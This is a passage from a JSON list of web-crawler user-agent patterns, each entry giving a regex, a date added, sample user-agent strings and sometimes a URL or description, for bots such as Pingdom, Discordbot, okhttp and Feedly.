      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) renderer/2020.2.0 Chrome/78.0.3904.130 Electron/7.1.7 Safari/537.36 PingdomTMS/2020.2",
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/61.0.3163.100 Chrome/61.0.3163.100 Safari/537.36 PingdomPageSpeed/1.0 (pingbot/2.0; http://www.pingdom.com/)"
    ],
    "url": "http://www.pingdom.com"
  }
  ,
  {
    "pattern": "AppInsights",
    "addition_date": "2019/03/09",
    "instances": [
      "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; AppInsights)"
    ],
    "url": "https://docs.microsoft.com/en-us/azure/azure-monitor/app/app-insights-overview"
  }
  ,
  {
    "pattern": "PhantomJS",
    "addition_date": "2017/09/18",
    "instances": [
      "Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1 bl.uk_lddc_renderbot/2.0.0 (+ http://www.bl.uk/aboutus/legaldeposit/websites/websites/faqswebmaster/index.html)"
    ],
    "url": "http://phantomjs.org/"
  }
  ,
  {
    "pattern": "Gowikibot",
    "addition_date": "2017/10/26",
    "instances": [
      "Mozilla/5.0 (compatible; Gowikibot/1.0; +http://www.gowikibot.com)"
    ],
    "url": "http://www.gowikibot.com"
  }
  ,
  {
    "pattern": "PiplBot",
    "addition_date": "2017/10/30",
    "instances": [
      "PiplBot (+http://www.pipl.com/bot/)",
      "Mozilla/5.0+(compatible;+PiplBot;+http://www.pipl.com/bot/)"
    ],
    "url": "http://www.pipl.com/bot/"
  }
  ,
  {
    "pattern": "Discordbot",
    "addition_date": "2017/09/22",
    "url": "https://discordapp.com",
    "instances": [
      "Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)"
    ]
  }
  ,
  {
    "pattern": "TelegramBot",
    "addition_date": "2017/10/01",
    "instances": [
      "TelegramBot (like TwitterBot)"
    ]
  }
  ,
  {
    "pattern": "Jetslide",
    "addition_date": "2017/09/27",
    "url": "http://jetsli.de/crawler",
    "instances": [
      "Mozilla/5.0 (compatible; Jetslide; +http://jetsli.de/crawler)"
    ]
  }
  ,
  {
    "pattern": "newsharecounts",
    "addition_date": "2017/09/30",
    "url": "http://newsharecounts.com/crawler",
    "instances": [
      "Mozilla/5.0 (compatible; NewShareCounts.com/1.0; +http://newsharecounts.com/crawler)"
    ]
  }
  ,
  {
    "pattern": "James BOT",
    "addition_date": "2017/10/12",
    "url": "http://cognitiveseo.com/bot.html",
    "instances": [
      "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6 - James BOT - WebCrawler http://cognitiveseo.com/bot.html"
    ]
  }
  ,
  {
    "pattern": "Bark[rR]owler",
    "addition_date": "2017/10/09",
    "url": "http://www.exensa.com/crawl",
    "instances": [
      "Barkrowler/0.5.1 (experimenting / debugging - sorry for your logs ) http://www.exensa.com/crawl - admin@exensa.com -- based on BuBiNG",
      "Barkrowler/0.7 (+http://www.exensa.com/crawl)",
      "BarkRowler/0.7 (+http://www.exensa.com/crawling)",
      "Barkrowler/0.9 (+http://www.exensa.com/crawl)"
    ]
  }
  ,
  {
    "pattern": "TinEye",
    "addition_date": "2017/10/14",
    "url": "http://www.tineye.com/crawler.html",
    "instances": [
      "Mozilla/5.0 (compatible; TinEye-bot/1.31; +http://www.tineye.com/crawler.html)",
      "TinEye/1.1 (http://tineye.com/crawler.html)"
    ]
  }
  ,
  {
    "pattern": "SocialRankIOBot",
    "addition_date": "2017/10/19",
    "url": "http://socialrank.io/about",
    "instances": [
      "SocialRankIOBot; http://socialrank.io/about"
    ]
  }
  ,
  {
    "pattern": "trendictionbot",
    "addition_date": "2017/10/30",
    "url": "http://www.trendiction.de/bot",
    "instances": [
      "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.0; trendictionbot0.5.0; trendiction search; http://www.trendiction.de/bot; please let us know of any problems; web at trendiction.com) Gecko/20071127 Firefox/3.0.0.11",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64; trendictionbot0.5.0; trendiction search; http://www.trendiction.de/bot; please let us know of any problems; web at trendiction.com) Gecko/20170101 Firefox/67.0"
    ]
  }
  ,
  {
    "pattern": "Ocarinabot",
    "addition_date": "2017/09/27",
    "instances": [
      "Ocarinabot"
    ]
  }
  ,
  {
    "pattern": "epicbot",
    "addition_date": "2017/10/31",
    "url": "http://www.epictions.com/epicbot",
    "instances": [
      "Mozilla/5.0 (compatible; epicbot; +http://www.epictions.com/epicbot)"
    ]
  }
  ,
  {
    "pattern": "Primalbot",
    "addition_date": "2017/09/27",
    "url": "https://www.primal.com",
    "instances": [
      "Mozilla/5.0 (compatible; Primalbot; +https://www.primal.com;)"
    ]
  }
  ,
  {
    "pattern": "DuckDuckGo-Favicons-Bot",
    "addition_date": "2017/10/06",
    "url": "http://duckduckgo.com",
    "instances": [
      "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
    ]
  }
  ,
  {
    "pattern": "GnowitNewsbot",
    "addition_date": "2017/10/30",
    "url": "http://www.gnowit.com",
    "instances": [
      "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0 / GnowitNewsbot / Contact information at http://www.gnowit.com"
    ]
  }
  ,
  {
    "pattern": "Leikibot",
    "addition_date": "2017/09/24",
    "url": "http://www.leiki.com",
    "instances": [
      "Mozilla/5.0 (Windows NT 6.3;compatible; Leikibot/1.0; +http://www.leiki.com)"
    ]
  }
  ,
  {
    "pattern": "LinkArchiver",
    "addition_date": "2017/09/24",
    "instances": [
      "@LinkArchiver twitter bot"
    ]
  }
  ,
  {
    "pattern": "YaK\\/",
    "addition_date": "2017/09/25",
    "url": "http://linkfluence.com",
    "instances": [
      "Mozilla/5.0 (compatible; YaK/1.0; http://linkfluence.com/; bot@linkfluence.com)"
    ]
  }
  ,
  {
    "pattern": "PaperLiBot",
    "addition_date": "2017/09/25",
    "url": "http://support.paper.li/entries/20023257-what-is-paper-li",
    "instances": [
      "Mozilla/5.0 (compatible; PaperLiBot/2.1; http://support.paper.li/entries/20023257-what-is-paper-li)",
      "Mozilla/5.0 (compatible; PaperLiBot/2.1; https://support.paper.li/entries/20023257-what-is-paper-li)"

    ]
  }
  ,
  {
    "pattern": "Digg Deeper",
    "addition_date": "2017/09/26",
    "url": "http://digg.com/about",
    "instances": [
      "Digg Deeper/v1 (http://digg.com/about)"
    ]
  }
  ,
  {
    "pattern": "dcrawl",
    "addition_date": "2017/09/22",
    "instances": [
      "dcrawl/1.0"
    ]
  }
  ,
  {
    "pattern": "Snacktory",
    "addition_date": "2017/09/23",
    "url": "https://github.com/karussell/snacktory",
    "instances": [
      "Mozilla/5.0 (compatible; Snacktory; +https://github.com/karussell/snacktory)"
    ]
  }
  ,
  {
    "pattern": "AndersPinkBot",
    "addition_date": "2017/09/24",
    "url": "http://anderspink.com/bot.html",
    "instances": [
      "Mozilla/5.0 (compatible; AndersPinkBot/1.0; +http://anderspink.com/bot.html)"
    ]
  }
  ,
  {
    "pattern": "Fyrebot",
    "addition_date": "2017/09/22",
    "instances": [
      "Fyrebot/1.0"
    ]
  }
  ,
  {
    "pattern": "EveryoneSocialBot",
    "addition_date": "2017/09/22",
    "url": "http://everyonesocial.com",
    "instances": [
      "Mozilla/5.0 (compatible; EveryoneSocialBot/1.0; support@everyonesocial.com http://everyonesocial.com/)"
    ]
  }
  ,
  {
    "pattern": "Mediatoolkitbot",
    "addition_date": "2017/10/06",
    "url": "http://mediatoolkit.com",
    "instances": [
      "Mediatoolkitbot (complaints@mediatoolkit.com)"
    ]
  }
  ,
  {
    "pattern": "Luminator-robots",
    "addition_date": "2017/09/22",
    "instances": [
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/30.0.1599.66 Safari/537.13 Luminator-robots/2.0"
    ]
  }
  ,
  {
    "pattern": "ExtLinksBot",
    "addition_date": "2017/11/02",
    "url": "https://extlinks.com/Bot.html",
    "instances": [
      "Mozilla/5.0 (compatible; ExtLinksBot/1.5 +https://extlinks.com/Bot.html)"
    ]
  }
  ,
  {
    "pattern": "SurveyBot",
    "addition_date": "2017/11/02",
    "instances": [
      "Mozilla/5.0 (Windows; U; Windows NT 5.1; en; rv:1.9.0.13) Gecko/2009073022 Firefox/3.5.2 (.NET CLR 3.5.30729) SurveyBot/2.3 (DomainTools)"
    ]
  }
  ,
  {
    "pattern": "NING\\/",
    "addition_date": "2017/11/02",
    "instances": [
      "NING/1.0"
    ]
  }
  ,
  {
    "pattern": "okhttp",
    "addition_date": "2017/11/02",
    "instances": [
      "okhttp/2.5.0",
      "okhttp/2.7.5",
      "okhttp/3.2.0",
      "okhttp/3.5.0",
      "okhttp/4.1.0"
    ]
  }
  ,
  {
    "pattern": "Nuzzel",
    "addition_date": "2017/11/02",
    "instances": [
      "Nuzzel"
    ]
  }
  ,
  {
    "pattern": "omgili",
    "addition_date": "2017/11/02",
    "url": "http://omgili.com",
    "instances": [
      "omgili/0.5 +http://omgili.com"
    ]
  }
  ,
  {
    "pattern": "PocketParser",
    "addition_date": "2017/11/02",
    "url": "https://getpocket.com/pocketparser_ua",
    "instances": [
      "PocketParser/2.0 (+https://getpocket.com/pocketparser_ua)"
    ]
  }
  ,
  {
    "pattern": "YisouSpider",
    "addition_date": "2017/11/02",
    "instances": [
      "YisouSpider",
      "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 YisouSpider/5.0 Safari/537.36"
    ]
  }
  ,
  {
    "pattern": "um-LN",
    "addition_date": "2017/11/02",
    "instances": [
      "Mozilla/5.0 (compatible; um-LN/1.0; mailto: techinfo@ubermetrics-technologies.com)"
    ]
  }
  ,
  {
    "pattern": "ToutiaoSpider",
    "addition_date": "2017/11/02",
    "url": "http://web.toutiao.com/media_cooperation/",
    "instances": [
      "Mozilla/5.0 (compatible; ToutiaoSpider/1.0; http://web.toutiao.com/media_cooperation/;)"
    ]
  }
  ,
  {
    "pattern": "MuckRack",
    "addition_date": "2017/11/02",
    "url": "http://muckrack.com",
    "instances": [
      "Mozilla/5.0 (compatible; MuckRack/1.0; +http://muckrack.com)"
    ]
  }
  ,
  {
    "pattern": "Jamie's Spider",
    "addition_date": "2017/11/02",
    "url": "http://jamiembrown.com/",
    "instances": [
      "Jamie's Spider (http://jamiembrown.com/)"
    ]
  }
  ,
  {
    "pattern": "AHC\\/",
    "addition_date": "2017/11/02",
    "instances": [
      "AHC/2.0"
    ]
  }
  ,
  {
    "pattern": "NetcraftSurveyAgent",
    "addition_date": "2017/11/02",
    "instances": [
      "Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)"
    ]
  }
  ,
  {
    "pattern": "Laserlikebot",
    "addition_date": "2017/11/02",
    "instances": [
      "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4 (compatible; Laserlikebot/0.1)"
    ]
  }
  ,
  {
    "pattern": "^Apache-HttpClient",
    "addition_date": "2017/11/02",
    "instances": [
      "Apache-HttpClient/4.2.3 (java 1.5)",
      "Apache-HttpClient/4.2.5 (java 1.5)",
      "Apache-HttpClient/4.3.1 (java 1.5)",
      "Apache-HttpClient/4.3.3 (java 1.5)",
      "Apache-HttpClient/4.3.5 (java 1.5)",
      "Apache-HttpClient/4.4.1 (Java/1.8.0_65)",
      "Apache-HttpClient/4.5.2 (Java/1.8.0_65)",
      "Apache-HttpClient/4.5.2 (Java/1.8.0_151)",
      "Apache-HttpClient/4.5.2 (Java/1.8.0_161)",
      "Apache-HttpClient/4.5.2 (Java/1.8.0_181)",
      "Apache-HttpClient/4.5.3 (Java/1.8.0_121)",
      "Apache-HttpClient/4.5.3-SNAPSHOT (Java/1.8.0_152)",
      "Apache-HttpClient/4.5.7 (Java/11.0.3)",
      "Apache-HttpClient/4.5.10 (Java/1.8.0_201)"
    ]
  }
  ,
  {
    "pattern": "AppEngine-Google",
    "addition_date": "2017/11/02",
    "instances": [
      "AppEngine-Google; (+http://code.google.com/appengine; appid: example)",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36 AppEngine-Google; (+http://code.google.com/appengine; appid: s~feedly-nikon3)"
    ]
  }
  ,
  {
    "pattern": "Jetty",
    "addition_date": "2017/11/02",
    "instances": [
      "Jetty/9.3.z-SNAPSHOT"
    ]
  }
  ,
  {
    "pattern": "Upflow",
    "addition_date": "2017/11/02",
    "instances": [
      "Upflow/1.0"
    ]
  }
  ,
  {
    "pattern": "Thinklab",
    "addition_date": "2017/11/02",
    "url": "thinklab.com",
    "instances": [
      "Thinklab (thinklab.com)"
    ]
  }
  ,
  {
    "pattern": "Traackr.com",
    "addition_date": "2017/11/02",
    "url": "Traackr.com",
    "instances": [
      "Traackr.com"
    ]
  }
  ,
  {
    "pattern": "Twurly",
    "addition_date": "2017/11/02",
    "url": "http://twurly.org",
    "instances": [
      "Ruby, Twurly v1.1 (http://twurly.org)"
    ]
  }
  ,
  {
    "pattern": "Mastodon",
    "addition_date": "2017/11/02",
    "instances": [
      "http.rb/2.2.2 (Mastodon/1.5.1; +https://example-masto-instance.org/)"
    ]
  }
  ,
  {
    "pattern": "http_get",
    "addition_date": "2017/11/02",
    "instances": [
      "http_get"
    ]
  }
  ,
  {
    "pattern": "DnyzBot",
    "addition_date": "2017/11/20",
    "instances": [
      "Mozilla/5.0 (compatible; DnyzBot/1.0)"
    ]
  }
  ,
  {
    "pattern": "botify",
    "addition_date": "2018/02/01",
    "instances": [
      "Mozilla/5.0 (compatible; botify; http://botify.com)"
    ]
  }
  ,
  {
    "pattern": "007ac9 Crawler",
    "addition_date": "2018/02/09",
    "instances": [
      "Mozilla/5.0 (compatible; 007ac9 Crawler; http://crawler.007ac9.net/)"
    ]
  }
  ,
  {
    "pattern": "BehloolBot",
    "addition_date": "2018/02/09",
    "instances": [
      "Mozilla/5.0 (compatible; BehloolBot/beta; +http://www.webeaver.com/bot)"
    ]
  }
  ,
  {
    "pattern": "BrandVerity",
    "addition_date": "2018/02/27",
    "instances": [
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:41.0) Gecko/20100101 Firefox/55.0 BrandVerity/1.0 (http://www.brandverity.com/why-is-brandverity-visiting-me)",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/11A465 Twitter for iPhone BrandVerity/1.0 (http://www.brandverity.com/why-is-brandverity-visiting-me)"
    ],
    "url": "http://www.brandverity.com/why-is-brandverity-visiting-me"
  }
  ,
  {
    "pattern": "check_http",
    "addition_date": "2018/02/09",
    "instances": [
      "check_http/v2.2.1 (nagios-plugins 2.2.1)"
    ]
  }
  ,
  {
    "pattern": "BDCbot",
    "addition_date": "2018/02/09",
    "instances": [
      "Mozilla/5.0 (Windows NT 6.1; compatible; BDCbot/1.0; +http://bigweb.bigdatacorp.com.br/faq.aspx) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64; BDCbot/1.0; +http://bigweb.bigdatacorp.com.br/faq.aspx) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36"
    ]
  }
  ,
  {
    "pattern": "ZumBot",
    "addition_date": "2018/02/09",
    "instances": [
      "Mozilla/5.0 (compatible; ZumBot/1.0; http://help.zum.com/inquiry)"
    ]
  }
  ,
  {
    "pattern": "EZID",
    "addition_date": "2018/02/09",
    "instances": [
      "EZID (EZID link checker; https://ezid.cdlib.org/)"
    ]
  }
  ,
  {
    "pattern": "ICC-Crawler",
    "addition_date": "2018/02/28",
    "instances": [
      "ICC-Crawler/2.0 (Mozilla-compatible; ; http://ucri.nict.go.jp/en/icccrawler.html)"
    ],
    "url": "http://ucri.nict.go.jp/en/icccrawler.html"
  }
  ,
  {
    "pattern": "ArchiveBot",
    "addition_date": "2018/02/28",
    "instances": [
      "ArchiveTeam ArchiveBot/20170106.02 (wpull 2.0.2)"
    ],
    "url": "https://github.com/ArchiveTeam/ArchiveBot"
  }
  ,
  {
    "pattern": "^LCC ",
    "addition_date": "2018/02/28",
    "instances": [
      "LCC (+http://corpora.informatik.uni-leipzig.de/crawler_faq.html)"
    ],
    "url": "http://corpora.informatik.uni-leipzig.de/crawler_faq.html"
  }
  ,
  {
    "pattern": "filterdb.iss.net\\/crawler",
    "addition_date": "2018/03/16",
    "instances": [
      "Mozilla/5.0 (compatible; oBot/2.3.1; +http://filterdb.iss.net/crawler/)"
    ],
    "url": "http://filterdb.iss.net/crawler/"
  }
  ,
  {
    "pattern": "BLP_bbot",
    "addition_date": "2018/03/27",
    "instances": [
      "BLP_bbot/0.1"
    ]
  }
  ,
  {
    "pattern": "BomboraBot",
    "addition_date": "2018/03/27",
    "instances": [
      "Mozilla/5.0 (compatible; BomboraBot/1.0; +http://www.bombora.com/bot)"
    ],
    "url": "http://www.bombora.com/bot"
  }
  ,
  {
    "pattern": "Buck\\/",
    "addition_date": "2018/03/27",
    "instances": [
      "Buck/2.2; (+https://app.hypefactors.com/media-monitoring/about.html)"
    ],
    "url": "https://app.hypefactors.com/media-monitoring/about.html"
  }
  ,
  {
    "pattern": "Companybook-Crawler",
    "addition_date": "2018/03/27",
    "instances": [
      "Companybook-Crawler (+https://www.companybooknetworking.com/)"
    ],
    "url": "https://www.companybooknetworking.com/"
  }
  ,
  {
    "pattern": "Genieo",
    "addition_date": "2018/03/27",
    "instances": [
      "Mozilla/5.0 (compatible; Genieo/1.0 http://www.genieo.com/webfilter.html)"
    ],
    "url": "http://www.genieo.com/webfilter.html"
  }
  ,
  {
    "pattern": "magpie-crawler",
    "addition_date": "2018/03/27",
    "instances": [
      "magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)"
    ],
    "url": "http://www.brandwatch.net"
  }
  ,
  {
    "pattern": "MeltwaterNews",
    "addition_date": "2018/03/27",
    "instances": [
      "MeltwaterNews www.meltwater.com"
    ],
    "url": "http://www.meltwater.com"
  }
  ,
  {
    "pattern": "Moreover",
    "addition_date": "2018/03/27",
    "instances": [
      "Mozilla/5.0 Moreover/5.1 (+http://www.moreover.com)"
    ],
    "url": "http://www.moreover.com"
  }
  ,
  {
    "pattern": "newspaper\\/",
    "addition_date": "2018/03/27",
    "instances": [
      "newspaper/0.1.0.7",
      "newspaper/0.2.5",
      "newspaper/0.2.6",
      "newspaper/0.2.8"
    ]
  }
  ,
  {
    "pattern": "ScoutJet",
    "addition_date": "2018/03/27",
    "instances": [
      "Mozilla/5.0 (compatible; ScoutJet; +http://www.scoutjet.com/)"
    ],
    "url": "http://www.scoutjet.com/"
  }
  ,
  {
    "pattern": "(^| )sentry\\/",
    "addition_date": "2018/03/27",
    "instances": [
      "sentry/8.22.0 (https://sentry.io)"
    ],
    "url": "https://sentry.io"
  }
  ,
  {
    "pattern": "StorygizeBot",
    "addition_date": "2018/03/27",
    "instances": [
      "Mozilla/5.0 (compatible; StorygizeBot; http://www.storygize.com)"
    ],
    "url": "http://www.storygize.com"
  }
  ,
  {
    "pattern": "UptimeRobot",
    "addition_date": "2018/03/27",
    "instances": [
      "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
    ],
    "url": "http://www.uptimerobot.com/"
  }
  ,
  {
    "pattern": "OutclicksBot",
    "addition_date": "2018/04/21",
    "instances": [
      "OutclicksBot/2 +https://www.outclicks.net/agent/VjzDygCuk4ubNmg40ZMbFqT0sIh7UfOKk8s8ZMiupUR",
      "OutclicksBot/2 +https://www.outclicks.net/agent/gIYbZ38dfAuhZkrFVl7sJBFOUhOVct6J1SvxgmBZgCe",
      "OutclicksBot/2 +https://www.outclicks.net/agent/PryJzTl8POCRHfvEUlRN5FKtZoWDQOBEvFJ2wh6KH5J",
      "OutclicksBot/2 +https://www.outclicks.net/agent/p2i4sNUh7eylJF1S6SGgRs5mP40ExlYvsr9GBxVQG6h"
    ],
    "url": "https://www.outclicks.net"
  }
  ,
  {
    "pattern": "seoscanners",
    "addition_date": "2018/05/27",
    "instances": [
      "Mozilla/5.0 (compatible; seoscanners.net/1; +spider@seoscanners.net)"
    ],
    "url": "http://www.seoscanners.net/"
  }
  ,
  {
    "pattern": "Hatena",
    "addition_date": "2018/05/29",
    "instances": [
      "Hatena Antenna/0.3",
      "Hatena::Russia::Crawler/0.01",
      "Hatena-Favicon/2 (http://www.hatena.ne.jp/faq/)",
      "Hatena::Scissors/0.01",
      "HatenaBookmark/4.0 (Hatena::Bookmark; Analyzer)",
      "Hatena::Fetcher/0.01 (master) Furl/3.13"
    ]
  }
  ,
  {
    "pattern": "Google Web Preview",
    "addition_date": "2018/05/31",
    "instances": [
      "Mozilla/5.0 (Linux; U; Android 2.3.4; generic) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Version/4.0 Mobile Safari/537.36",
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/27.0.1453 Safari/537.36"
    ]
  }
  ,
  {
    "pattern": "MauiBot",
    "addition_date": "2018/06/06",
    "instances": [
      "MauiBot (crawler.feedback+wc@gmail.com)"
    ]
  }
  ,
  {
    "pattern": "AlphaBot",
    "addition_date": "2018/05/27",
    "instances": [
      "Mozilla/5.0 (compatible; AlphaBot/3.2; +http://alphaseobot.com/bot.html)"
    ],
    "url": "http://alphaseobot.com/bot.html"
  }
  ,
  {
    "pattern": "SBL-BOT",
    "addition_date": "2018/06/06",
    "instances": [
      "SBL-BOT (http://sbl.net)"
    ],
    "url": "http://sbl.net",
    "description" : "Bot of SoftByte BlackWidow"
  }
  ,
  {
    "pattern": "IAS crawler",
    "addition_date": "2018/06/06",
    "instances": [
      "IAS crawler (ias_crawler; http://integralads.com/site-indexing-policy/)"
    ],
    "url": "http://integralads.com/site-indexing-policy/",
    "description" : "Bot of Integral Ad Science, Inc."
  }
  ,
  {
    "pattern": "adscanner",
    "addition_date": "2018/06/24",
    "instances": [
      "Mozilla/5.0 (compatible; adscanner/)"
    ]
  }
  ,
  {
    "pattern": "Netvibes",
    "addition_date": "2018/06/24",
    "instances": [
      "Netvibes (crawler/bot; http://www.netvibes.com",
      "Netvibes (crawler; http://www.netvibes.com)"
    ],
    "url": "http://www.netvibes.com"
  }
  ,
  {
    "pattern": "acapbot",
    "addition_date": "2018/06/27",
    "instances": [
      "Mozilla/5.0 (compatible;acapbot/0.1;treat like Googlebot)",
      "Mozilla/5.0 (compatible;acapbot/0.1.;treat like Googlebot)"
    ]
  }
  ,
  {
    "pattern": "Baidu-YunGuanCe",
    "addition_date": "2018/06/27",
    "instances": [
      "Baidu-YunGuanCe-Bot(ce.baidu.com)",
      "Baidu-YunGuanCe-SLABot(ce.baidu.com)",
      "Baidu-YunGuanCe-ScanBot(ce.baidu.com)",
      "Baidu-YunGuanCe-PerfBot(ce.baidu.com)",
      "Baidu-YunGuanCe-VSBot(ce.baidu.com)"
    ],
    "url": "https://ce.baidu.com/topic/topic20150908",
    "description": "Baidu Cloud Watch"
  }
  ,
  {
    "pattern": "bitlybot",
    "addition_date": "2018/06/27",
    "instances": [
      "bitlybot/3.0 (+http://bit.ly/)",
      "bitlybot/2.0",
      "bitlybot"
    ],
    "url": "http://bit.ly/"
  }
  ,
  {
    "pattern": "blogmuraBot",
    "addition_date": "2018/06/27",
    "instances": [
      "blogmuraBot (+http://www.blogmura.com)"
    ],
    "url": "http://www.blogmura.com",
    "description": "A blog ranking site which links to blogs on just about every theme possible."
  }
  ,
  {
    "pattern": "Bot.AraTurka.com",
    "addition_date": "2018/06/27",
    "instances": [
      "Bot.AraTurka.com/0.0.1"
    ],
    "url": "http://www.araturka.com"
  }
  ,
  {
    "pattern": "bot-pge.chlooe.com",
    "addition_date": "2018/06/27",
    "instances": [
      "bot-pge.chlooe.com/1.0.0 (+http://www.chlooe.com/)"
    ]
  }
  ,
  {
    "pattern": "BoxcarBot",
    "addition_date": "2018/06/27",
    "instances": [
      "Mozilla/5.0 (compatible; BoxcarBot/1.1; +awesome@boxcar.io)"
    ],
    "url": "https://boxcar.io/"
  }
  ,
  {
    "pattern": "BTWebClient",
    "addition_date": "2018/06/27",
    "instances": [
      "BTWebClient/180B(9704)"
    ],
    "url": "http://www.utorrent.com/",
    "description": "µTorrent BitTorrent Client"
  }
  ,
  {
    "pattern": "ContextAd Bot",
    "addition_date": "2018/06/27",
    "instances": [
      "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0;.NET CLR 1.0.3705; ContextAd Bot 1.0)",
      "ContextAd Bot 1.0"
    ]
  }
  ,
  {
    "pattern": "Digincore bot",
    "addition_date": "2018/06/27",
    "instances": [
      "Mozilla/5.0 (compatible; Digincore bot; https://www.digincore.com/crawler.html for rules and instructions.)"
    ],
    "url": "http://www.digincore.com/crawler.html"
  }
  ,
  {
    "pattern": "Disqus",
    "addition_date": "2018/06/27",
    "instances": [
      "Disqus/1.0"
    ],
    "url": "https://disqus.com/",
    "description": "validate and quality check pages."
  }
  ,
  {
    "pattern": "Feedly",
    "addition_date": "2018/06/27",
    "instances": [
      "Feedly/1.0 (+http://www.feedly.com/fetcher.html; like FeedFetcher-Google)",
      "FeedlyBot/1.0 (http://feedly.com)"
    ],
    "url": "https://www.feedly.com/fetcher.html",
    "description": "Feedly Fetcher is how Feedly grabs RSS or Atom feeds when users choose to add them to their Feedly or any of the other applications built on top of the feedly cloud."
  }
  ,
  {
    "pattern": "Fetch\\/",
    "addition_date": "2018/06/27",
    "instances": [
      "Fetch/2.0a (CMS Detection/Web/SEO analysis tool, see http://guess.scritch.org)"
    ]
  }
  ,
  {
    "pattern": "Fever",
    "addition_date": "2018/06/27",
    "instances": [
      "Fever/1.38 (Feed Parser; http://feedafever.com; Allow like Gecko)"
    ],
    "url": "http://feedafever.com"
  }
  ,
  {
    "pattern": "Flamingo_SearchEngine",
    "addition_date": "2018/06/27",
    "instances": [
      "Flamingo_SearchEngine (+http://www.flamingosearch.com/bot)"
    ]
  }
  ,
  {
    "pattern": "FlipboardProxy",
    "addition_date": "2018/06/27",
    "instances": [
      "Mozilla/5.0 (compatible; FlipboardProxy/1.1; +http://flipboard.com/browserproxy)",
      "Mozilla/5.0 (compatible; FlipboardProxy/1.2; +http://flipboard.com/browserproxy)",
      "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6 (FlipboardProxy/1.1; +http://flipboard.com/browserproxy)",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:28.0) Gecko/20100101 Firefox/28.0 (FlipboardProxy/1.1; +http://flipboard.com/browserproxy)",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0 (FlipboardProxy/1.2; +http://flipboard.com/browserproxy)"
    ],
    "url": "https://about.flipboard.com/browserproxy/",
    "description": "a proxy service to fetch, validate, and prepare certain elements of websites for presentation through the Flipboard Application"
  }
  ,
  {
    "pattern": "g2reader-bot",
    "addition_date": "2018/06/27",
    "instances": [
      "g2reader-bot/1.0 (+http://www.g2reader.com/)"
    ],
    "url": "http://www.g2reader.com/"
  }
  ,
  {
    "pattern": "G2 Web Services",
    "addition_date": "2019/03/01",
    "instances": [
      "G2 Web Services/1.0 (built with StormCrawler Archetype 1.8; https://www.g2webservices.com/; developers@g2llc.com)"
    ],
    "url": "https://www.g2webservices.com/"
  }
  ,
  {
    "pattern": "imrbot",
    "addition_date": "2018/06/27",
    "instances": [
      "Mozilla/5.0 (compatible; imrbot/1.10.8 +http://www.mignify.com)"
    ],
    "url": "http://www.mignify.com"
  }
  ,
  {
    "pattern": "K7MLWCBot",
    "addition_date": "2018/06/27",
    "instances": [
      "K7MLWCBot/1.0 (+http://www.k7computing.com)"
    ],
    "url": "http://www.k7computing.com",
    "description": "Virus scanner"
  }
  ,
  {
    "pattern": "Kemvibot",
    "addition_date": "2018/06/27",
    "instances": [
      "Kemvibot/1.0 (http://kemvi.com, marco@kemvi.com)"
    ],
    "url": "http://kemvi.com"
  }
  ,
  {
    "pattern": "Landau-Media-Spider",
    "addition_date": "2018/06/27",
    "instances": [
      "Landau-Media-Spider/1.0(http://bots.landaumedia.de/bot.html)"
    ],
    "url": "http://bots.landaumedia.de/bot.html"
  }
  ,
  {
    "pattern": "linkapediabot",
    "addition_date": "2018/06/27",
    "instances": [
      "linkapediabot (+http://www.linkapedia.com)"
    ],
    "url": "http://www.linkapedia.com"
  }
  ,
  {
    "pattern": "vkShare",
    "addition_date": "2018/07/02",
    "instances": [
      "Mozilla/5.0 (compatible; vkShare; +http://vk.com/dev/Share)"
    ],
    "url": "http://vk.com/dev/Share"
  }
  ,
  {
    "pattern": "Siteimprove.com",
    "addition_date": "2018/06/22",
    "instances": [
      "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0) LinkCheck by Siteimprove.com",
      "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.0) Match by Siteimprove.com",
